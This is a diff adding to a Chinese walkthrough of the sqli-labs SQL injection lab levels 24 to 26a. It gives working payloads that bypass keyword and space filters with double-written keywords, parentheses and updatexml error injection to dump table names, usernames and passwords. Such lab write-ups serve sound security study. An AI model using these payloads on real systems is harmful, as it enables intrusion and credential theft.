@@ -133,7 +133,9 @@ Your Password:1
 
 ![5e342978e3b54ffc963764f8deb51beb](./img/Less-24-4.PNG)
 
-之后也用户名admin'#和密码是123456登录，进入修改密码页面。原始密码输入123456，新密码我输入的是111111，可以看到密码修改成功。
+
+
+之后用户名admin'#和密码123456登录，进入修改密码页面。原始密码输入123456，新密码我输入的是111111，可以看到密码修改成功。
 
 ![Less-24-2](./img/Less-24-5.PNG)
 
@@ -146,3 +148,199 @@ Your Password:1
 当我们数据库查看的时候发现修改的是管理员的密码。而不是我们的注册账户的密码。
 
 ![ae806d5ca34d4b1990c78b1983e8a214](./img/Less-24-8.PNG)
+
+
+
+# level25
+
+![Less-25-01](./img/Less-25-01.PNG)
+
+第二十五关根据提示是将or和and这两替换成空，但只替换一次。大小写绕过没有用则可用双写绕过并用联合注入，information里面涉及or可以写成infoorrmation，爆表名：
+
+~~~ shell
+?id=-2' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+
+~~~
+
+![Less-25-02](./img/Less-25-02.PNG)
+
+
+
+爆数据列：
+
+~~~ shell
+?id=-2' union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users'--+
+~~~
+
+![Less-25-03](./img/Less-25-03.PNG)
+
+
+
+password中含有or，写成passwoorrd，爆数据：
+
+~~~ shell
+?id=-2' union select 1,2,group_concat(passwoorrd,id,username) from users --+
+~~~
+
+![Less-25-04](./img/Less-25-04.PNG)
+
+
+
+# level25a
+
+![Less-25a-01](./img/Less-25a-01.PNG)
+
+同样的网站将or和and这两替换成空，但只替换一次。大小写绕过没有用则可用双写绕过并用联合注入，information里面涉及or可以写成infoorrmation，爆表名：
+
+~~~ shell
+?id=-2 union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+
+~~~
+
+![Less-25a-02](./img/Less-25a-02.PNG)
+
+
+
+爆数据列：
+
+~~~ shell
+?id=-2 union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users'--+
+~~~
+
+![Less-25a-03](./img/Less-25a-03.PNG)
+
+
+
+password中含有or，写成passwoorrd，爆数据：
+
+~~~ shell
+?id=-2 union select 1,2,group_concat(passwoorrd,id,username) from users --+
+~~~
+
+![Less-25a-04](./img/Less-25a-04.PNG)
+
+
+
+# level26
+
+第二十六关将逻辑运算符，注释符以及空格过滤了，用单引号闭合，双写绕过逻辑运算符或者用&&和||替换
+
+
+
+源码
+
+~~~ shell
+function blacklist($id)
+{
+    //过滤替换or
+    $id= preg_replace('/or/i',"", $id);	
+    //过滤替换and
+    $id= preg_replace('/and/i',"", $id);	
+    //过滤替换/*
+    $id= preg_replace('/[\/\*]/',"", $id);
+    //过滤替换--   （注释符一部分）
+    $id= preg_replace('/[--]/',"", $id);	
+    //过滤替换#    （注释符）
+    $id= preg_replace('/[#]/',"", $id);
+    //过滤替换\s      
+    //\s: 匹配一个空格符 等价于【\n\r\f\v\t】
+    $id= preg_replace('/[\s]/',"", $id);	
+    //过滤替换 /\
+    $id= preg_replace('/[\/\\\\]/',"", $id);	
+    return $id;
+}
+~~~
+
+
+
+常规代替空格的字符：
+
+~~~ shell
+%09 TAB 键（水平）
+%0a 新建一行
+%0b TAB 键（垂直）
+%0c 新的一页
+%0d return 功能
+%a0 空格
+~~~
+
+基本上把所有可替代空格的都过滤了。但是空格的作用还可以用括号代替。
+
+在windows和kali里面用不了，可能因为apache解析不了。只能用()绕过，报错注入空格使用比较少所以可用报错注入
+
+![Less-26-01](./img/Less-26-01.PNG)
+
+
+
+再测一下闭合和回显位 【一个比较不常用的注释符`;%00`】
+
+~~~ shell
+?id=1'anandd'1'='1         回显正常
+?id=1';%00                 回显正常
+?id=1';%00--+              报错
+闭合是单引号
+
+----------------------------
+?id=1'union(select(1));%00                     报错
+?id=1'union(select(1),(2));%00                 报错
+?id=1'union(select(1),(2),(3));%00             回显正常
+回显位是3
+
+~~~
+
+所以这题用括号代替空格+报错注入
+
+
+
+爆表
+
+~~~ shell
+?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0
+~~~
+
+![Less-26-02](./img/Less-26-02.PNG)
+
+
+
+爆字段
+
+~~~ shell
+?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security'aandnd(table_name='users')))),1))||'0
+~~~
+
+![Less-26-03](./img/Less-26-03.PNG)
+
+
+
+爆账号密码
+
+~~~ shell
+?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||'0
+~~~
+
+![Less-26-04](./img/Less-26-04.PNG)
+
+
+
+
+
+# level26a
+
+![Less-26a-01](./img/Less-26a-01.PNG)
+
+和上一关不同，不显示具体报错，导致无法报错注入
+
+![Less-26a-02](./img/Less-26a-02.PNG)
+
+那就回归联合注入，闭合是单引号+括号`')'`
+
+
+
+爆表
+
+~~~ shell
+?id=1') ||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))|| ('0'='0
+~~~
+
+![Less-26a-03](./img/Less-26a-03.PNG)
+
+
+
